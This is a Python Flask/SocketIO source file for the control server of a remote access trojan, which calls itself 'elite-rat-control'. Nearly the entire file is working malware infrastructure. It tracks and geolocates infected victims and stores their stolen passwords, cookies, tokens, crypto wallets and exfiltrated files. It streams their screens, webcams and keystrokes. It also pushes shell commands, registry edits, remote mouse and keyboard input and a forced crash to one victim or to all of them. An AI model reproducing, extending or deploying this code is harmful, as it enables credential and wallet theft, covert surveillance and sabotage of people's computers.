from flask import Flask, render_template, request, jsonify, Response, send_from_directory, session, redirect, url_for
from flask_socketio import SocketIO, emit, join_room, leave_room
import base64
import os
import json
import time
from datetime import datetime
import threading
from collections import defaultdict
from functools import wraps

# Ensure recordings directory exists
REC_DIR = 'recordings'
if not os.path.exists(REC_DIR):
    os.makedirs(REC_DIR)

app = Flask(__name__, template_folder='templates')
app.config['SECRET_KEY'] = 'elite-rat-control-2026'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Storage
clients = {}
client_commands = defaultdict(list)
client_files = defaultdict(list)
client_stolen_data = defaultdict(lambda: {"passwords": [], "cookies": [], "tokens": [], "wallets": [], "files": []})
dashboard_sids = set()

# Login Logic
ACCESS_CODE = "KEER"

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.json
        if data.get('code') == ACCESS_CODE:
            session['authenticated'] = True
            return jsonify({'status': 'ok'})
        return jsonify({'status': 'invalid'}), 401
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('authenticated', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    return render_template('dashboard.html')

@app.route('/api/clients')
@login_required
def api_clients():
    return jsonify({
        'clients': [
            {
                'id': cid,
                'status': clients.get(cid, {}).get('status', 'offline'),
                'ip': clients.get(cid, {}).get('ip', 'unknown'),
                'os': clients.get(cid, {}).get('os', 'unknown'),
                'hostname': clients.get(cid, {}).get('hostname', 'unknown'),
                'active_window': clients.get(cid, {}).get('active_window', 'Desktop'),
                'last_seen': clients.get(cid, {}).get('last_seen', 'never'),
                'location': clients.get(cid, {}).get('location', {}),
                'stolen_count': len(client_stolen_data[cid]["passwords"]) + len(client_stolen_data[cid]["tokens"])
            }
            for cid in clients.keys()
        ]
    })

@app.route('/api/clients/<client_id>/stolen')
@login_required
def get_stolen_data(client_id):
    if client_id in client_stolen_data:
        return jsonify(client_stolen_data[client_id])
    return jsonify({"error": "No data"}), 404

@app.route('/api/clients/<client_id>/location')
@login_required
def get_location(client_id):
    if client_id in clients:
        ip = clients[client_id]['ip']
        # If testing locally, fetch public IP for Map to work
        if ip == '127.0.0.1' or ip.startswith('192.168.') or ip.startswith('10.'):
            try:
                import requests
                ip = requests.get("https://api.ipify.org", timeout=5).text
            except: pass
        
        try:
            import requests
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            data = r.json()
            clients[client_id]['location'] = data
            return jsonify(data)
        except: pass
    return jsonify({'error': 'failed'})

@app.route('/api/clients/<client_id>/cmd', methods=['POST'])
@login_required
def send_cmd(client_id):
    cmd = request.json.get('cmd', '')
    if client_id in clients:
        cmd_entry = {'cmd': cmd, 'id': len(client_commands[client_id])}
        client_commands[client_id].append(cmd_entry)
        # Forward command to the client via socketio
        socketio.emit('run_command', {'cmd': cmd, 'id': cmd_entry['id']}, room=client_id)
        return jsonify({'status': 'sent'})
    return jsonify({'error': 'offline'}), 404

# SocketIO Events
@socketio.on('connect')
def handle_connect():
    print('Connection attempt:', request.sid)

@socketio.on('dashboard_join')
def handle_dashboard_join():
    """Dashboard browsers join to receive broadcast updates."""
    # Note: In a real app, you'd check session here too
    dashboard_sids.add(request.sid)
    join_room('dashboard')
    # Send current client list
    client_list = []
    for cid, cdata in clients.items():
        client_list.append({
            'id': cid,
            'status': cdata.get('status', 'offline'),
            'ip': cdata.get('ip', 'unknown'),
            'os': cdata.get('os', 'unknown'),
            'hostname': cdata.get('hostname', 'unknown'),
            'last_seen': cdata.get('last_seen', 'never')
        })
    emit('clients_update', {'clients': client_list})
    print(f"Dashboard joined: {request.sid}")

@socketio.on('get_clients')
def handle_get_clients():
    """Return current client list to requesting dashboard."""
    client_list = []
    for cid, cdata in clients.items():
        client_list.append({
            'id': cid,
            'status': cdata.get('status', 'offline'),
            'ip': cdata.get('ip', 'unknown'),
            'os': cdata.get('os', 'unknown'),
            'hostname': cdata.get('hostname', 'unknown'),
            'last_seen': cdata.get('last_seen', 'never')
        })
    emit('clients_update', {'clients': client_list})

def broadcast_clients():
    """Broadcast updated client list to all dashboards."""
    client_list = []
    for cid, cdata in clients.items():
        client_list.append({
            'id': cid,
            'status': cdata.get('status', 'offline'),
            'ip': cdata.get('ip', 'unknown'),
            'os': cdata.get('os', 'unknown'),
            'hostname': cdata.get('hostname', 'unknown'),
            'active_window': cdata.get('active_window', 'Desktop'),
            'last_seen': cdata.get('last_seen', 'never')
        })
    socketio.emit('clients_update', {'clients': client_list}, room='dashboard')

@socketio.on('register_client')
def register_client(data):
    client_id = data['client_id']
    clients[client_id] = {
        'sid': request.sid,
        'status': 'online',
        'ip': request.remote_addr,
        'os': data.get('os', 'unknown'),
        'hostname': data.get('hostname', 'unknown'),
        'active_window': data.get('active_window', 'Desktop'),
        'last_seen': datetime.now().isoformat(),
        'screen': None,
        'webcam': None
    }
    join_room(client_id)
    broadcast_clients()
    print(f"New client registered: {client_id}")

@socketio.on('heartbeat')
def heartbeat(data):
    client_id = data['client_id']
    if client_id in clients:
        clients[client_id]['last_seen'] = datetime.now().isoformat()
        clients[client_id]['status'] = 'online'
        
        # Update metadata
        if 'active_window' in data:
            clients[client_id]['active_window'] = data['active_window']
        
        # Capture metrics if provided
        if 'metrics' in data:
            clients[client_id]['metrics'] = data['metrics']
            socketio.emit('metrics_update', {
                'client_id': client_id,
                'metrics': data['metrics']
            }, room='dashboard')
        
        broadcast_clients() # Refresh dashboard

        # Send pending commands
        if client_commands[client_id]:
            # Simple way to send the most recent command if the client asks
            emit('pending_commands', client_commands[client_id][-1:], room=client_id)

@socketio.on('screen_data')
def screen_data(data):
    client_id = data['client_id']
    if client_id in clients:
        clients[client_id]['screen'] = data['image']
        # Forward to dashboards for live view
        socketio.emit('screen_frame', {
            'client_id': client_id,
            'image': data['image']
        }, room='dashboard')

@socketio.on('save_record')
def handle_save_record(data):
    """Save incoming recording frames to the server's disk."""
    client_id = data.get('client_id')
    rec_type = data.get('type', 'screen')
    chunk = data.get('data')
    if client_id and chunk:
        try:
            filename = f"rec_{client_id}_{rec_type}.dat"
            with open(os.path.join(REC_DIR, filename), "ab") as f:
                f.write(base64.b64decode(chunk))
        except: pass

@socketio.on('webcam_data')
def webcam_data(data):
    client_id = data['client_id']
    if client_id in clients:
        clients[client_id]['webcam'] = data['image']
        socketio.emit('webcam_frame', {
            'client_id': client_id,
            'image': data['image']
        }, room='dashboard')

@socketio.on('cmd_result')
def cmd_result(data):
    client_id = data['client_id']
    result_id = data.get('result_id')
    if result_id is not None and client_id in client_commands and len(client_commands[client_id]) > result_id:
        client_commands[client_id][result_id]['result'] = data.get('output', '')
    # Broadcast to dashboards
    socketio.emit('cmd_output', {
        'client_id': client_id,
        'output': data.get('output', '')
    }, room='dashboard')

@socketio.on('keys_data')
def keys_data(data):
    client_id = data['client_id']
    socketio.emit('keys_update', {
        'client_id': client_id,
        'keys': data.get('keys', '')
    }, room='dashboard')

@socketio.on('sysinfo_data')
def handle_sysinfo_data(data):
    """Forward detailed system info from client to dashboard"""
    socketio.emit('sysinfo_received', data, room='dashboard')

# --- Phase 2: Exfiltration Handlers ---

@socketio.on('stolen_report')
def handle_stolen_report(data):
    client_id = data.get('client_id')
    payload = data.get('data', {})
    if client_id:
        for key in ["passwords", "cookies", "tokens", "wallets"]:
            if key in payload:
                client_stolen_data[client_id][key].extend(payload[key])
                # Remove duplicates
                client_stolen_data[client_id][key] = list(set(client_stolen_data[client_id][key]))
        
        socketio.emit('toast', {'msg': f'New stolen data from {client_id[:8]}!', 'type': 'success'}, room='dashboard')
        socketio.emit('stolen_update', {'client_id': client_id}, room='dashboard')

@socketio.on('exfiltrate_file')
def handle_exfiltrate_file(data):
    client_id = data.get('client_id')
    filename = data.get('filename')
    file_data = data.get('data')
    if client_id and filename and file_data:
        # Save to disk
        upload_dir = os.path.join('uploads', client_id)
        if not os.path.exists(upload_dir): os.makedirs(upload_dir)
        
        with open(os.path.join(upload_dir, filename), 'wb') as f:
            f.write(base64.b64decode(file_data))
        
        client_stolen_data[client_id]["files"].append({
            "name": filename,
            "path": f"/uploads/{client_id}/{filename}",
            "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        socketio.emit('toast', {'msg': f'Uploaded: {filename}', 'type': 'info'}, room='dashboard')
        socketio.emit('stolen_update', {'client_id': client_id}, room='dashboard')

@app.route('/uploads/<client_id>/<filename>')
@login_required
def download_exfiltrated(client_id, filename):
    return send_from_directory(os.path.join('uploads', client_id), filename)

@socketio.on('toggle_stream')
def handle_toggle_stream(data):
    """Forward stream toggle to the target client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('toggle_stream', data, room=client_id)

@socketio.on('get_processes')
def handle_get_processes(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('get_processes', data, room=client_id)

@socketio.on('kill_process')
def handle_kill_process(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('kill_process', data, room=client_id)

@socketio.on('bulk_command')
def handle_bulk_command(data):
    """Execute command or event on all online clients."""
    cmd = data.get('cmd', '')
    for client_id in list(clients.keys()):
        if clients[client_id].get('status') == 'online':
            if cmd == 'trigger_bsod':
                socketio.emit('trigger_bsod', {'mode': 'real'}, room=client_id)
            else:
                socketio.emit('run_command', {'cmd': cmd, 'id': 999}, room=client_id)
    socketio.emit('toast', {'msg': f'Bulk command/event broadcasted', 'type': 'success'}, room='dashboard')

# --- Phase 3: Registry Management ---

@socketio.on('get_registry')
def handle_get_registry(data):
    """Forward registry request to specific client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('get_registry', data, room=client_id)

@socketio.on('write_registry')
def handle_write_registry(data):
    """Forward registry write request to specific client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('write_registry', data, room=client_id)

@socketio.on('delete_registry')
def handle_delete_registry(data):
    """Forward registry delete request to specific client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('delete_registry', data, room=client_id)

# --- Remote Input Forwarding ---
@socketio.on('mouse_move')
def handle_mouse_move(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('mouse_move', data, room=client_id)

@socketio.on('mouse_move_relative')
def handle_mouse_move_relative(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('mouse_move_relative', data, room=client_id)

@socketio.on('mouse_click')
def handle_mouse_click(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('mouse_click', data, room=client_id)

@socketio.on('key_press')
def handle_key_press(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('key_press', data, room=client_id)

@socketio.on('scroll')
def handle_scroll(data):
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('scroll', data, room=client_id)

# --- Phase 4: Advanced File Management ---

@socketio.on('upload_file')
def handle_upload_file(data):
    """Bridge file upload to client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('upload_file', data, room=client_id)

@socketio.on('zip_folder')
def handle_zip_folder(data):
    """Bridge zip folder request to client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('zip_folder', data, room=client_id)

@socketio.on('get_sysinfo')
def handle_get_sysinfo(data):
    """Request detailed system info from client."""
    client_id = data.get('client_id')
    if client_id and client_id in clients:
        socketio.emit('get_sysinfo', data, room=client_id)

@socketio.on('disconnect')
def handle_disconnect():
    # Remove from dashboard set
    dashboard_sids.discard(request.sid)
    # Check if it was a client
    for client_id, client_data in list(clients.items()):
        if client_data['sid'] == request.sid:
            clients[client_id]['status'] = 'offline'
            broadcast_clients()
            break

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    socketio.run(app, host='0.0.0.0', port=port, debug=False)